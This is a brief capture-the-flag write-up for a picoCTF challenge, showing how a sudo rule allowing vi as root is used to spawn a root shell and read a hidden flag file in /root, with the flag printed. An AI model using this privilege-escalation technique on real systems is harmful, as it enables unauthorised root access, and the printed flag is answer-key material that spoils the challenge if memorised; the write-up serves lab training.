
Can you read files in the root file?

Additional details will be available after launching your challenge instance.

## Solucion

```
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer:
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi



picoplayer@challenge:~$ sudo /usr/bin/vi

:set shell = /bin/bash
:shell

root@challenge:/home/picoplayer# cd /root
root@challenge:~# ls
root@challenge:~# ls -la
total 12
drwx------ 1 root root   23 Mar 16 02:29 .
drwxr-xr-x 1 root root   51 Mar 17 05:26 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Mar 16 02:29 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
root@challenge:~# cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_021d10ab}
root@challenge:~#



```

